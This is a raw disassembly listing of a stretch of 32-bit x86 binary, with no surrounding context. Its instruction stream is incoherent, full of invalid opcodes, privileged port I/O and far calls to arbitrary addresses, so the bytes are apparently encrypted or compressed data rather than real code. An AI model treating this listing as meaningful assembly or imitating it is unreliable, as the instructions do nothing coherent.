  40998c:	xchg   DWORD PTR [ebp+0x138ab6a5],esp
  409992:	mov    dl,0x3d
  409994:	and    ebp,esp
  409996:	sub    BYTE PTR ds:0x4a0afdd6,al
  40999c:	hlt    
  40999d:	out    0xc2,eax
  40999f:	pop    edx
  4099a0:	xor    dh,BYTE PTR [ebp-0x4b]
  4099a3:	(bad)  
  4099a4:	std    
  4099a5:	retf   
  4099a6:	nop    esi
  4099a9:	jecxz  0x409930
  4099ab:	cdq    
  4099ac:	mov    eax,0xc9dfb544
  4099b1:	add    eax,0xd05b0412
  4099b6:	push   DWORD PTR [eax+0x3]
  4099b9:	ret    0x4c16
  4099bc:	or     BYTE PTR ds:0xaaf2d019,ch
  4099c2:	int    0x77
  4099c4:	shl    DWORD PTR [ebx+0x54],cl
  4099c7:	dec    edx
  4099c8:	add    BYTE PTR [edx+0x3b75f33c],dl
  4099ce:	or     bh,BYTE PTR [ebp-0x179bc616]
  4099d4:	pop    ebp
  4099d5:	mov    ebp,0x36f6c821
  4099da:	(bad)  [eax+0x1929fa4f]
  4099e0:	mov    edi,0x5b496c5d
  4099e5:	out    0x7b,eax
  4099e7:	dec    ecx
  4099e8:	add    BYTE PTR [edi-0x70],cl
  4099eb:	add    al,0x82
  4099ed:	sbb    al,0xc3
  4099ef:	pusha  
  4099f0:	scas   eax,DWORD PTR es:[edi]
  4099f1:	faddp  st(2),st
  4099f3:	leave  
  4099f4:	xchg   DWORD PTR [ebx],ebx
  4099f6:	mov    gs,ebx
  4099f8:	push   esp
  4099f9:	push   esi
  4099fa:	add    DWORD PTR [ebx+0x170736a9],esi
  409a00:	pop    ss
  409a01:	adc    edx,ecx
  409a03:	xchg   ebp,eax
  409a04:	adc    edx,DWORD PTR [edx-0x62]
  409a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a08:	je     0x409a80
  409a0a:	sbb    BYTE PTR [eax-0x1f],dl
  409a0d:	clc    
  409a0e:	cs loopne 0x409a11
  409a11:	sbb    bl,BYTE PTR [eax-0x46]
  409a14:	test   al,0xf1
  409a16:	mov    edi,0xbf95f04e
  409a1b:	xor    DWORD PTR [eax-0x76],ebx
  409a1e:	cmp    ebp,DWORD PTR [esi+0x6b]
  409a21:	pusha  
  409a22:	mov    edi,0xe00d38fb
  409a27:	or     BYTE PTR ds:0x4c8fadb2,ch
  409a2d:	(bad)  
  409a2e:	or     dh,BYTE PTR [ebx]
  409a30:	or     al,0xd5
  409a32:	les    ebx,FWORD PTR [ebp+edx*8+0x5c124c66]
  409a39:	dec    edx
  409a3a:	les    esp,FWORD PTR [esi+0x7a]
  409a3d:	pop    ss
  409a3e:	cs push ds
  409a40:	rcr    BYTE PTR [eax+0x2],1
  409a43:	lea    ebp,ds:0xbce70dd4
  409a49:	call   esi
  409a4b:	in     al,dx
  409a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a4d:	enter  0x92b9,0xa6
  409a51:	inc    ebx
  409a52:	xchg   ecx,eax
  409a53:	(bad)  
  409a54:	not    DWORD PTR [edx]
  409a56:	ins    BYTE PTR es:[edi],dx
  409a57:	int    0x4d
  409a59:	add    DWORD PTR [ecx],ebx
  409a5b:	xor    BYTE PTR [ecx-0x5b0fc35e],dl
  409a61:	jecxz  0x4099f9
  409a63:	adc    esi,DWORD PTR [esi]
  409a65:	mov    edx,0xbddfbb38
  409a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a6b:	shl    DWORD PTR [ebx-0x5a],1
  409a6e:	jb     0x409a7e
  409a70:	fdivrp st(1),st
  409a72:	mov    dh,0xed
  409a74:	les    edx,FWORD PTR [ebp+0x40]
  409a77:	popf   
  409a78:	inc    edx
  409a79:	pop    edx
  409a7a:	loop   0x409a45
  409a7c:	stc    
  409a7d:	push   ds
  409a7e:	mov    ch,0xc4
  409a80:	push   ds
  409a81:	cmp    bh,dl
  409a83:	inc    ebx
  409a84:	push   eax
  409a85:	sub    al,BYTE PTR [edx]
  409a87:	push   esi
  409a88:	or     bh,BYTE PTR [edx]
  409a8a:	mov    eax,0xab635e72
  409a8f:	test   al,cl
  409a91:	pcmpgtw mm7,QWORD PTR [ebp+ebx*4-0x33f5b561]
  409a99:	dec    ebp
  409a9a:	pop    ebx
  409a9b:	cmp    eax,0x2f4e6d75
  409aa0:	push   esi
  409aa1:	dec    ebx
  409aa2:	mov    eax,ds:0x4002c1f4
  409aa7:	in     al,dx
  409aa8:	out    0xe7,al
  409aaa:	or     dh,BYTE PTR [esi]
  409aac:	in     al,dx
  409aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aae:	cdq    
  409aaf:	fcom   DWORD PTR gs:[eax-0x66]
  409ab3:	xchg   esi,eax
  409ab4:	data16 fmul QWORD PTR [edi]
  409ab7:	cs mov ch,dh
  409aba:	les    edx,FWORD PTR [ecx-0x1b]
  409abd:	popf   
  409abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409abf:	inc    ebp
  409ac0:	test   edi,ecx
  409ac2:	sbb    cl,BYTE PTR [eax-0x50]
  409ac5:	or     dh,BYTE PTR [ecx-0x16f7049b]
  409acb:	jo     0x409b4b
  409acd:	shl    edx,cl
  409acf:	clc    
  409ad0:	out    0xf8,eax
  409ad2:	sbb    al,bl
  409ad4:	in     al,dx
  409ad5:	and    al,0xe8
  409ad7:	ret    0xc70a
  409ada:	adc    esp,ecx
  409adc:	mov    bh,cl
  409ade:	loopne 0x409af8
  409ae0:	push   ebp
  409ae1:	shl    DWORD PTR [edi-0x3a],1
  409ae4:	add    eax,0x1f027a44
  409ae9:	ins    BYTE PTR es:[edi],dx
  409aea:	daa    
  409aeb:	aam    0xc2
  409aed:	cmp    eax,0xa3098793
  409af2:	sub    eax,0x1bf65db4
  409af7:	repnz or eax,0xbab23e8d
  409afd:	sub    eax,0x5c4298ee
  409b02:	cmp    dh,dl
  409b04:	call   0x5916:0xb20c7d5a
  409b0b:	call   0x30fc:0x3b26f738
  409b12:	clc    
  409b13:	inc    esp
  409b14:	xlat   BYTE PTR ds:[ebx]
  409b15:	sub    ch,ch
  409b17:	inc    ecx
  409b18:	dec    edi
  409b19:	mov    eax,ds:0xc428e94a
  409b1e:	dec    esi
  409b1f:	aad    0x13
  409b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b22:	lods   eax,DWORD PTR ds:[esi]
  409b23:	and    DWORD PTR [ebx],edi
  409b25:	dec    edx
  409b26:	and    DWORD PTR [ebx],ebp
  409b28:	jmp    0xe0d1:0xbc589a75
  409b2f:	xor    eax,0xddd38fe9
  409b34:	ret    0xff43
  409b37:	(bad)  
  409b39:	and    DWORD PTR [esi],0x59
  409b3c:	xchg   esp,eax
  409b3d:	ins    BYTE PTR es:[edi],dx
  409b3e:	das    
  409b3f:	xor    al,0x65
  409b41:	in     eax,dx
  409b42:	mov    ch,0x31
  409b44:	call   0x5fcb:0x19261a7c
  409b4b:	rcl    DWORD PTR [edi],1
  409b4d:	or     al,0x26
  409b4f:	arpl   WORD PTR [esi],cx
  409b51:	or     DWORD PTR [eax+0x72],edi
  409b54:	sub    al,BYTE PTR [edi+0x28]
  409b57:	test   eax,0xdf38269
  409b5c:	arpl   WORD PTR [edx],cx
  409b5e:	bound  ebp,QWORD PTR [ebx-0x1a]
  409b61:	inc    esp
  409b62:	aad    0x3d
  409b64:	adc    eax,0xa8733294
  409b69:	xor    BYTE PTR [edx+edi*4+0xa],bl
  409b6d:	add    ecx,DWORD PTR [esp+ebx*8]
  409b70:	fidiv  WORD PTR [esi+0x2]
  409b73:	mov    WORD PTR [esi-0x2cfca43e],ds
  409b79:	mov    ss,WORD PTR [ebp+esi*1-0x28f12328]
  409b80:	sub    BYTE PTR [ebp+0x7789472c],bh
  409b86:	(bad)  
  409b87:	retf   0xb148
  409b8a:	xchg   ebp,eax
  409b8b:	mov    bh,0xbd
  409b8d:	mov    bh,0x35
  409b8f:	or     bh,BYTE PTR [ecx+0x1bb57fea]
  409b95:	lock call 0x95d63cad
  409b9b:	into   
  409b9c:	pushf  
  409b9d:	sbb    dl,cl
  409b9f:	mov    eax,ds:0x18fc8d6e
  409ba4:	push   ecx
  409ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ba6:	ficom  DWORD PTR [ecx-0x5f785b11]
  409bac:	sub    bl,0x48
  409baf:	sbb    cl,BYTE PTR [edx-0x27089b00]
  409bb5:	mov    ds:0x3826d740,al
  409bba:	and    eax,ecx
  409bbc:	mov    cl,0x87
  409bbe:	xor    eax,0xbd6702f
  409bc3:	xlat   BYTE PTR ds:[ebx]
  409bc4:	sar    edx,1
  409bc6:	(bad)  
  409bc7:	mov    ecx,DWORD PTR [edx]
  409bc9:	cs xchg ecx,eax
  409bcb:	lea    eax,[ebx+0x40851474]
  409bd1:	enter  0xd021,0x3e
  409bd5:	pusha  
  409bd6:	(bad)
  409bd9:	xor    eax,0xbbf7da33
  409bde:	xor    al,0xeb
  409be0:	repnz mov DWORD PTR [ecx-0x3b],esi
  409be4:	dec    ebx
  409be5:	push   0x30
  409be7:	adc    DWORD PTR [edi-0x4487267d],eax
  409bed:	jle    0x409c54
  409bef:	add    BYTE PTR [eax-0x10befecd],cl
  409bf5:	lods   al,BYTE PTR ds:[esi]
  409bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bf7:	and    BYTE PTR [edi-0x2e645d3d],ch
  409bfd:	jg     0x409b9f
  409bff:	cmp    al,0xeb
  409c01:	ins    DWORD PTR es:[edi],dx
  409c02:	sbb    BYTE PTR [edi+0x10],0xea
  409c06:	(bad)  
  409c07:	jae    0x409c44
  409c09:	inc    edx
  409c0a:	mov    ebp,0xdfa7686b
  409c0f:	cmp    edi,DWORD PTR [edx-0x68]
  409c12:	xor    eax,0xefdcbda1
  409c17:	pop    eax
  409c18:	bound  edx,QWORD PTR [edx+esi*2+0x10]
  409c1c:	cld    
  409c1d:	mov    esi,0x9b8760e4
  409c22:	mov    ds:0x7eb6256,al
  409c27:	pushf  
  409c28:	das    
  409c29:	in     eax,dx
  409c2a:	adc    dl,dh
  409c2c:	mov    eax,ds:0x62d15cdb
  409c31:	out    dx,al
  409c32:	test   BYTE PTR [ebx-0x6],ch
  409c35:	or     edx,esp
  409c37:	xchg   edx,eax
  409c38:	sbb    bl,BYTE PTR [edx]
  409c3a:	nop
  409c3b:	and    ebx,DWORD PTR [edx+0x56]
  409c3e:	scas   eax,DWORD PTR es:[edi]
  409c3f:	pop    ecx
  409c40:	or     esi,DWORD PTR ds:0x3c502f9f
  409c46:	sbb    DWORD PTR gs:[eax+0x4ae6dbc2],eax
  409c4d:	pop    edi
  409c4e:	in     al,dx
  409c4f:	cmc    
  409c50:	or     BYTE PTR [esi-0x3a096a4a],bl
  409c56:	jp     0x409cb3
  409c58:	add    al,BYTE PTR [eax-0x7c]
  409c5b:	ror    BYTE PTR [ebx-0xa],1
  409c5e:	and    eax,0xeb6fc639
  409c63:	push   ss
  409c64:	xor    cl,BYTE PTR [eax+0x5f7fefa7]
  409c6a:	test   al,0x8
  409c6c:	outs   dx,BYTE PTR ds:[esi]
  409c6d:	test   DWORD PTR [ecx-0x410baa70],ecx
  409c73:	adc    ecx,DWORD PTR [esi+esi*2-0x6e]
  409c77:	mov    DWORD PTR [edi],eax
  409c79:	hlt    
  409c7a:	ret    0x88f1
  409c7d:	mov    edi,0x22d9bd55
  409c82:	pop    ss
  409c83:	das    
  409c84:	adc    ah,BYTE PTR [edx-0x5fd254bd]
  409c8a:	push   ecx
  409c8b:	les    ecx,FWORD PTR [ebp-0x4b]
  409c8e:	cmp    BYTE PTR [ebx],cl
  409c90:	mov    DWORD PTR [esi+ebp*8+0x2e],eax
  409c94:	fld    QWORD PTR [ebp+0x5079b77e]
  409c9a:	adc    edi,DWORD PTR [eax-0x2d5ff174]
  409ca0:	sbb    DWORD PTR [ebp-0x4],ebx
  409ca3:	pop    esp
  409ca4:	inc    eax
  409ca5:	cmp    DWORD PTR [edi],edi
  409ca7:	call   0xf35f8471
  409cac:	cmp    esp,0xbf198d9e
  409cb2:	and    DWORD PTR ds:0xaccb7ffa,eax
  409cb8:	and    al,0xf6
  409cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cbb:	mov    edi,0xe1b7c751
  409cc0:	inc    ebx
  409cc1:	call   0xc1f:0x9786b92a
  409cc8:	icebp  
  409cc9:	fild   QWORD PTR [ebp-0x60]
  409ccc:	repz (bad) 
  409cce:	icebp  
  409ccf:	sar    DWORD PTR [eax+eiz*8-0x3a],1
  409cd3:	mov    BYTE PTR [eax],ch
  409cd5:	jno    0x409cee
  409cd7:	nop
  409cd8:	adc    ah,ah
  409cda:	repnz mov cl,ah
  409cdd:	push   ebx
  409cde:	sbb    al,0xf0
  409ce0:	push   edi
  409ce1:	mov    ds:0x340217c3,eax
  409ce6:	popa   
  409ce7:	imul   ebp,DWORD PTR [eax],0xffffffb7
  409cea:	pop    esp
  409ceb:	jp     0x409cd6
  409ced:	jmp    0xf3713188
  409cf2:	fistp  DWORD PTR [ecx-0x6]
  409cf5:	dec    eax
  409cf6:	or     al,0x53
  409cf8:	loop   0x409cbe
  409cfa:	(bad)  
  409cfb:	lds    ebp,FWORD PTR [ebx+0x54ec2786]
  409d01:	push   ss
  409d02:	jle    0x409d7c
  409d04:	adc    al,0xc1
  409d06:	xchg   edx,eax
  409d07:	push   0x2b0a6a0c
  409d0c:	jecxz  0x409d5f
  409d0e:	push   ecx
  409d0f:	jnp    0x409c9b
  409d11:	adc    eax,0x48a39bb
  409d16:	imul   edx,edi,0x91bd647
  409d1c:	mov    esp,0x623e2d53
  409d21:	rcr    BYTE PTR [eax+0x23a84988],0xe3
  409d28:	loopne 0x409d4a
  409d2a:	and    ebp,DWORD PTR [ebx+0x63]
  409d2d:	adc    eax,0x8e0b886b
  409d32:	je     0x409d1f
  409d34:	das    
  409d35:	or     eax,0xe08d1f8c
  409d3a:	and    al,0xb0
  409d3c:	loop   0x409da8
  409d3e:	dec    edx
  409d3f:	pop    ecx
  409d40:	test   eax,0x5bbc1239
  409d45:	inc    ebp
  409d46:	or     ebx,DWORD PTR [ebx-0x799a5cb0]
  409d4c:	dec    ebp
  409d4d:	dec    ebp
  409d4e:	int    0x6e
  409d50:	mov    edx,0x9bef3998
  409d55:	inc    ebx
  409d56:	daa    
  409d57:	pop    es
  409d58:	pop    esp
  409d59:	push   ecx
  409d5a:	or     al,0x56
  409d5c:	jbe    0x409d09
  409d5e:	and    eax,0x7c0b1a3a
  409d63:	iret   
  409d64:	hlt    
  409d65:	jb     0x409db1
  409d67:	pop    es
  409d68:	(bad)  
  409d69:	loop   0x409d85
  409d6b:	iret   
  409d6c:	push   eax
  409d6d:	cmp    esi,DWORD PTR [edx]
  409d6f:	add    dh,dl
  409d71:	inc    esp
  409d72:	mov    ds:0x47009222,eax
  409d77:	pop    ebp
  409d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d79:	inc    esp
  409d7a:	sbb    eax,0xa9df929f
  409d7f:	je     0x409df4
  409d81:	dec    ebp
  409d82:	and    eax,0x296febd6
  409d87:	jbe    0x409d09
  409d89:	call   FWORD PTR [edx+ebx*8-0x6ae42d70]
  409d90:	arpl   bp,ax
  409d92:	push   eax
  409d93:	imul   edx,DWORD PTR [edi],0xffffffca
  409d96:	hlt    
  409d97:	inc    eax
  409d98:	mov    ch,bl
  409d9a:	jecxz  0x409d23
  409d9c:	push   ss
  409d9d:	push   esi
  409d9e:	mov    ds,ebx
  409da0:	icebp  
  409da1:	lea    edi,[edi+ebx*8-0x5114705c]
  409da8:	je     0x409da4
  409daa:	scas   al,BYTE PTR es:[edi]
  409dab:	mov    cl,0xcd
  409dad:	pop    ds
  409dae:	das    
  409daf:	fdivr  st,st(3)
  409db1:	int    0xe7
  409db3:	sbb    BYTE PTR ds:[edx-0x4cbe1676],bh
  409dba:	push   edi
  409dbb:	rol    dl,0xdc
  409dbe:	mov    WORD PTR [ecx-0x30a22d3d],?
  409dc4:	outs   dx,DWORD PTR ds:[esi]
  409dc5:	fldcw  WORD PTR [ecx+0x3d]
  409dc8:	repz dec esi
  409dca:	mov    ebp,0x454e86f2
  409dcf:	inc    esi
  409dd0:	cmc    
  409dd1:	dec    eax
  409dd2:	push   cs
  409dd3:	or     eax,0xc86a3e41
  409dd8:	add    ah,BYTE PTR [esi+0x56]
  409ddb:	stos   DWORD PTR es:[edi],eax
  409ddc:	out    0x93,eax
  409dde:	aas    
  409ddf:	(bad)
  409de2:	test   al,0xd8
  409de4:	inc    ebp
  409de5:	pop    edi
  409de6:	scas   eax,DWORD PTR es:[edi]
  409de7:	mov    ebp,0xff85aa78
  409dec:	idiv   BYTE PTR ds:0x72d5a8ba
  409df2:	add    al,0x1e
  409df4:	and    edx,DWORD PTR [ebp+0x25]
  409df7:	inc    eax
  409df8:	and    ebx,DWORD PTR [esi+0x46443b59]
  409dfe:	stos   DWORD PTR es:[edi],eax
  409dff:	push   ebx
  409e00:	mov    cs,WORD PTR [eax+0x61b666ab]
  409e06:	ret    0xe0fd
  409e09:	retf   
  409e0a:	js     0x409e28
  409e0c:	je     0x409dba
  409e0e:	stc    
  409e0f:	cmp    edx,ebp
  409e11:	je     0x409e2e
  409e13:	mov    eax,0xc649dcda
  409e18:	test   dh,0xb2
  409e1b:	xchg   edx,eax
  409e1c:	xchg   esp,eax
  409e1d:	fld    st(1)
  409e1f:	sti    
  409e20:	mov    dl,0xbc
  409e22:	out    dx,al
  409e23:	jp     0x409de0
  409e25:	add    dl,al
  409e27:	imul   ecx,DWORD PTR [ebp+0x6e],0x2d
  409e2b:	pop    edi
  409e2c:	ror    eax,cl
  409e2e:	mov    al,0xee
  409e30:	es push esp
  409e32:	retf   0xa475
  409e35:	mov    esp,0x842b7d7c
  409e3a:	push   esi
  409e3b:	aaa    
  409e3c:	pop    ebp
  409e3d:	mov    bh,0x2d
  409e3f:	sbb    BYTE PTR [edi],bh
  409e41:	pop    ebx
  409e42:	jecxz  0x409e9b
  409e44:	rol    BYTE PTR [edi-0x78f88053],cl
  409e4a:	je     0x409e22
  409e4c:	mov    esi,0x9308f507
  409e51:	push   esp
  409e52:	jne    0x409e31
  409e54:	test   al,0xd
  409e56:	xchg   ebp,eax
  409e57:	adc    BYTE PTR cs:[ebx-0x2],cl
  409e5b:	and    eax,0x8d056b9e
  409e60:	xor    al,0xb0
  409e62:	fsubr  st(7),st
  409e64:	push   ebp
  409e65:	add    DWORD PTR [edx-0x3e],0x680bdadf
  409e6c:	loopne 0x409e58
  409e6e:	pop    esp
  409e6f:	scas   al,BYTE PTR es:[edi]
  409e70:	cld    
  409e71:	xchg   esi,eax
  409e72:	rcl    DWORD PTR [bp+di-0x51],0xbd
  409e77:	xlat   BYTE PTR ds:[ebx]
  409e78:	xchg   esp,eax
  409e79:	in     al,0xea
  409e7b:	pop    ds
  409e7c:	lea    ecx,[edi]
  409e7e:	sbb    edi,DWORD PTR [ebx-0x38]
  409e81:	popf   
  409e82:	je     0x409e80
  409e84:	adc    BYTE PTR ss:[edi],ch
  409e87:	mov    eax,ds:0x568cdb5b
  409e8c:	aam    0x51
  409e8e:	jnp    0x409e5e
  409e90:	and    DWORD PTR [edi+0x2c2a2742],esi
  409e96:	jae    0x409f09
  409e98:	iret   
  409e99:	ins    BYTE PTR es:[edi],dx
  409e9a:	test   al,0x53
  409e9c:	sahf   
  409e9d:	aad    0x8d
  409e9f:	les    ebp,FWORD PTR [ebp+0x5d1ae6b6]
  409ea5:	outs   dx,BYTE PTR ds:[esi]
  409ea6:	or     BYTE PTR [eax+0x12],0x48
  409eaa:	pusha  
  409eab:	enter  0xca9,0x71
  409eaf:	mov    bh,0x22
  409eb1:	mov    al,es:0xab115e1a
  409eb7:	add    BYTE PTR fs:[ecx-0x2df75b17],dl
  409ebe:	and    edi,DWORD PTR [ebp-0x1f]
  409ec1:	js     0x409f3b
  409ec3:	or     ch,ch
  409ec5:	xchg   edx,eax
  409ec6:	mov    eax,0x609eb764
  409ecb:	cmp    al,BYTE PTR [ebp-0xdfeccca]
  409ed1:	test   edi,0x45c638cb
  409ed7:	sbb    BYTE PTR [edi+0x3a],bl
  409eda:	test   eax,0xdf7133f5
  409edf:	(bad)  
  409ee0:	xor    ah,BYTE PTR [ebp+0x25]
  409ee3:	repnz add ch,BYTE PTR [ecx+0x72]
  409ee7:	fdivr  st,st(3)
  409ee9:	lds    edi,FWORD PTR [eax+0x1a]
  409eec:	popf   
  409eed:	add    DWORD PTR [ecx+0x13a82b47],0xaaf1b48
  409ef7:	cmp    eax,0x7092bc7c
  409efc:	ret    0xa442
  409eff:	les    esp,FWORD PTR cs:[ebx-0x47fb09bb]
  409f06:	xchg   ebx,eax
  409f07:	jb     0x409f86
  409f09:	xchg   edi,eax
  409f0a:	fistp  QWORD PTR [ebp+0x50]
  409f0d:	icebp  
  409f0e:	lods   eax,DWORD PTR ds:[esi]
  409f0f:	repz cmp BYTE PTR [eax-0x2e],dh
  409f13:	stc    
  409f14:	icebp  
  409f15:	shl    DWORD PTR [edx+0x69effa37],0xae
  409f1c:	fxch   st(5)
  409f1e:	mov    bl,BYTE PTR ds:0x6220165a
  409f24:	inc    edi
  409f25:	and    BYTE PTR [esp+ecx*2-0x63],bl
  409f29:	lds    ebp,FWORD PTR [edx-0x36f10bb]
  409f2f:	cmp    bh,bh
  409f31:	sahf   
  409f32:	add    al,dh
  409f34:	push   edx
  409f35:	push   edx
  409f36:	sub    ebp,DWORD PTR [ecx-0x50ee30e7]
  409f3c:	add    al,0xc9
  409f3e:	pusha  
  409f3f:	mov    al,0x9e
  409f41:	xor    edx,esi
  409f43:	cmp    BYTE PTR [eax+0x44f2d078],bh
  409f49:	push   ss
  409f4a:	das    
  409f4b:	mov    eax,0x1c7b1d3e
  409f50:	xchg   edi,eax
  409f51:	or     al,0x52
  409f53:	mov    ah,0xc8
  409f55:	in     eax,0x5c
  409f57:	mov    ds:0x299143ef,eax
  409f5c:	sub    al,0x62
  409f5e:	fbld   TBYTE PTR [ecx+edi*8]
  409f61:	sub    edx,DWORD PTR [edi+0x75]
  409f64:	pop    es
  409f65:	retf   0xcbc8
  409f68:	adc    DWORD PTR [eax],ebp
  409f6a:	pop    eax
  409f6b:	jne    0x409f60
  409f6d:	push   ss
  409f6e:	push   eax
  409f6f:	dec    eax
  409f70:	or     al,0x52
  409f72:	imul   edi,DWORD PTR [edx-0x4c7b6c92],0xf8649f46
  409f7c:	inc    eax
  409f7d:	outs   dx,BYTE PTR ds:[esi]
  409f7e:	(bad)  
  409f7f:	nop
  409f80:	mov    ds:0x190cd46c,eax
  409f85:	adc    BYTE PTR [esi+edx*8+0x52],0xf7
  409f8a:	mov    eax,0x643859bf
  409f8f:	jo     0x409fdf
  409f91:	sbb    al,0x47
  409f93:	sbb    DWORD PTR [edx-0x3ac99e06],ecx
  409f99:	inc    eax
  409f9a:	cmp    BYTE PTR [ebp-0x8],dl
  409f9d:	dec    edi
  409f9e:	ret    0xf9c2
  409fa1:	push   eax
  409fa2:	cmp    al,0x8f
  409fa4:	int    0x70
  409fa6:	pop    edx
  409fa7:	mov    esi,0x8fa738bb
  409fac:	addr16 (bad) 
  409fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409faf:	pop    edx
  409fb0:	rcl    BYTE PTR [edx-0x37f6ec34],cl
  409fb6:	in     eax,dx
  409fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb8:	dec    esi
  409fb9:	xor    eax,0x168fc084
  409fbe:	mov    WORD PTR [edx-0x11e2b8bf],cs
  409fc4:	out    0xc1,eax
  409fc6:	(bad)  
  409fc7:	ins    BYTE PTR es:[edi],dx
  409fc8:	aam    0x94
  409fca:	in     eax,0x32
  409fcc:	add    eax,0x38b67d3e
  409fd1:	or     BYTE PTR [edx],ah
  409fd3:	int    0x97
  409fd5:	loopne 0x409fd4
  409fd7:	mov    WORD PTR [ecx],ds
  409fd9:	sub    bl,BYTE PTR [edx+0x47c82842]
  409fdf:	shr    DWORD PTR [edx-0x17],cl
  409fe2:	jb     0x409fca
  409fe4:	xor    esi,DWORD PTR [ebx+ecx*1-0x52]
  409fe8:	in     eax,0x1c
  409fea:	clc    
  409feb:	sub    eax,0x3bd78144
  409ff0:	in     eax,dx
  409ff1:	push   cs
  409ff2:	pop    eax
  409ff3:	or     DWORD PTR [ecx+edi*4-0x5b829148],ebp
  409ffa:	int    0x59
  409ffc:	xor    BYTE PTR [ebx],ah
  409ffe:	aad    0x56
  40a000:	fs push esi
  40a002:	(bad)  
  40a003:	pop    ss
  40a004:	outs   dx,BYTE PTR ds:[esi]
  40a005:	cmp    DWORD PTR [esi],esi
  40a007:	iret   
  40a008:	fwait
  40a009:	mov    ah,0x55
  40a00b:	inc    ebx
  40a00c:	and    dl,BYTE PTR [edx+ecx*1+0x521c0097]
  40a013:	pop    ss
  40a014:	jbe    0x40a049
  40a016:	push   ecx
  40a017:	jo     0x40a02d
  40a019:	test   DWORD PTR [eax],ebp
  40a01b:	repnz ins BYTE PTR es:[edi],dx
  40a01d:	mov    edi,0x15114bf7
  40a022:	jle    0x40a005
  40a024:	jcxz   0x40a06e
  40a027:	sbb    DWORD PTR [ebp+0x6d],edx
  40a02a:	push   ebx
  40a02b:	(bad)  
  40a02c:	mov    esi,0xeda564f
  40a031:	dec    ebx
  40a032:	inc    ebp
  40a033:	dec    DWORD PTR [esi+0x4b389654]
  40a039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a03a:	sub    esi,eax
  40a03c:	mov    al,ds:0x9705d82f
  40a041:	pushf  
  40a042:	out    0xaf,al
  40a044:	(bad)  
  40a045:	jecxz  0x40a001
  40a047:	fcmovu st,st(0)
  40a049:	and    al,0xe0
  40a04b:	adc    al,0x87
  40a04d:	xor    DWORD PTR [edx-0x5c],esi
  40a050:	mov    ebp,0x4caa119d
  40a055:	xchg   esp,eax
  40a056:	xchg   esi,eax
  40a057:	int    0xc7
  40a059:	repz jns 0x40a05b
  40a05c:	lock fidivr WORD PTR [ebx]
  40a05f:	xchg   edx,eax
  40a060:	xchg   esi,eax
  40a061:	push   ss
  40a062:	test   eax,edi
  40a064:	(bad)  
  40a065:	fdivr  DWORD PTR [ebx-0x39]
  40a068:	jle    0x40a07f
  40a06a:	xchg   ebx,eax
  40a06b:	push   ds
  40a06c:	out    dx,eax
  40a06d:	mov    ds:0xa8c5d931,eax
  40a072:	daa    
  40a073:	sub    eax,0x7880465f
  40a078:	sahf   
  40a079:	jno    0x40a062
  40a07b:	cmp    BYTE PTR [ecx+0x108422cf],0x22
  40a082:	daa    
  40a083:	mov    edi,0x64b03c19
  40a088:	(bad)  
  40a089:	xlat   BYTE PTR ds:[ebx]
  40a08a:	repnz (bad) 
  40a08c:	ja     0x40a0bd
  40a08e:	xchg   ecx,eax
  40a08f:	test   eax,0x507cace0
  40a094:	and    dl,BYTE PTR [ebp+0x23]
  40a097:	mov    ch,0xd0
  40a099:	xchg   ebx,eax
  40a09a:	cmp    BYTE PTR [ebp-0x38],ah
  40a09d:	aam    0x30
  40a09f:	jns    0x40a0f2
  40a0a1:	outs   dx,DWORD PTR ds:[esi]
  40a0a2:	fldcw  WORD PTR [edi+esi*8+0x77381490]
  40a0a9:	inc    esi
  40a0aa:	mov    eax,ds:0x574565c2
  40a0af:	dec    ecx
  40a0b0:	jo     0x40a121
  40a0b2:	shl    DWORD PTR [esi+edx*4],1
  40a0b5:	fs popa 
  40a0b7:	fmulp  st(5),st
  40a0b9:	icebp  
  40a0ba:	xor    ebx,esi
  40a0bc:	dec    edi
  40a0bd:	mov    esi,DWORD PTR [eax-0x4bfaf319]
  40a0c3:	xchg   ebx,eax
  40a0c4:	add    BYTE PTR [esi-0x1b],dh
  40a0c7:	xchg   edi,eax
  40a0c8:	dec    ebp
  40a0c9:	mov    ecx,0x43e443d0
  40a0ce:	pop    ecx
  40a0cf:	xchg   esi,eax
  40a0d0:	call   0x6dc1:0xf50a18b0
  40a0d7:	ds js  0x40a067
  40a0da:	into   
  40a0db:	mov    ch,BYTE PTR [edi]
  40a0dd:	cmc    
  40a0de:	test   DWORD PTR [edi-0x63],ebp
  40a0e1:	xor    eax,0xed277ff7
  40a0e6:	or     edx,DWORD PTR [ecx]
  40a0e8:	rcr    BYTE PTR [ecx+esi*1],0x4c
  40a0ec:	mov    ah,0xea
  40a0ee:	jb     0x40a0c6
  40a0f0:	cmp    bh,BYTE PTR [edx-0x733d6c72]
  40a0f6:	pop    ebp
  40a0f7:	pop    eax
  40a0f8:	cmp    DWORD PTR [eax-0x2d],ebp
  40a0fb:	shr    DWORD PTR [ebx],0xdd
  40a0fe:	jge    0x40a0e4
  40a100:	and    eax,0x442f1262
  40a105:	test   al,0xbc
  40a107:	imul   ebp,ecx,0xfffffff6
  40a10a:	xlat   BYTE PTR ds:[ebx]
  40a10b:	stos   BYTE PTR es:[edi],al
  40a10c:	xor    dh,al
  40a10e:	jbe    0x40a104
  40a110:	xor    eax,0x973a46f9
  40a115:	or     al,0x5a
  40a117:	mov    dh,BYTE PTR [ebp+edx*8-0x4b]
  40a11b:	and    dl,dl
  40a11d:	sub    esp,DWORD PTR [edx+0x9cd0158]
  40a123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a124:	pusha  
  40a125:	ins    BYTE PTR es:[edi],dx
  40a126:	mov    ebx,0x51dd961c
  40a12b:	jecxz  0x40a0ca
  40a12d:	scas   eax,DWORD PTR es:[edi]
  40a12e:	scas   eax,DWORD PTR es:[edi]
  40a12f:	inc    ebp
  40a130:	sbb    al,0xbc
